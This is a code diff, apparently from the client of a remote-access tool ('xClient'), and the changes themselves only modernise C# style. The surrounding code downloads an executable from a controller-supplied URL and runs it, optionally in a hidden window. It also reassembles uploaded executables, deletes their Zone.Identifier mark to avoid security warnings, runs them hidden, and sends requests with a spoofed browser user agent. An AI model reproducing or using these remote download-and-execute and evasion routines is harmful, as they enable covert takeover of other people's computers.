@@ -20,11 +20,11 @@ namespace xClient.Core.Commands
 
             new Thread(() =>
             {
-                string tempFile = FileHelper.GetTempFilePath(".exe");
+                var tempFile = FileHelper.GetTempFilePath(".exe");
 
                 try
                 {
-                    using (WebClient c = new WebClient())
+                    using (var c = new WebClient())
                     {
                         c.Proxy = null;
                         c.DownloadFile(command.URL, tempFile);
@@ -46,7 +46,7 @@ namespace xClient.Core.Commands
                     if (!FileHelper.IsValidExecuteableFile(bytes))
                         throw new Exception("no pe file");
 
-                    ProcessStartInfo startInfo = new ProcessStartInfo();
+                    var startInfo = new ProcessStartInfo();
                     if (command.RunHidden)
                     {
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
@@ -72,14 +72,14 @@ namespace xClient.Core.Commands
             if (!_renamedFiles.ContainsKey(command.ID))
                 _renamedFiles.Add(command.ID, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));
 
-            string filePath = _renamedFiles[command.ID];
+            var filePath = _renamedFiles[command.ID];
 
             try
             {
                 if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !FileHelper.IsValidExecuteableFile(command.Block))
                     throw new Exception("No executable file");
 
-                FileSplit destFile = new FileSplit(filePath);
+                var destFile = new FileSplit(filePath);
 
                 if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                     throw new Exception(destFile.LastError);
@@ -91,7 +91,7 @@ namespace xClient.Core.Commands
 
                     FileHelper.DeleteZoneIdentifier(filePath);
 
-                    ProcessStartInfo startInfo = new ProcessStartInfo();
+                    var startInfo = new ProcessStartInfo();
                     if (command.RunHidden)
                     {
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
@@ -109,7 +109,7 @@ namespace xClient.Core.Commands
                 if (_renamedFiles.ContainsKey(command.ID))
                     _renamedFiles.Remove(command.ID);
                 NativeMethods.DeleteFile(filePath);
-                new Packets.ClientPackets.SetStatus(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
+                new Packets.ClientPackets.SetStatus($"Execution failed: {ex.Message}").Execute(client);
             }
         }
 
@@ -128,7 +128,7 @@ namespace xClient.Core.Commands
                 {
                     try
                     {
-                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
+                        var request = (HttpWebRequest)WebRequest.Create(url);
                         request.UserAgent =
                             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
                         request.AllowAutoRedirect = true;
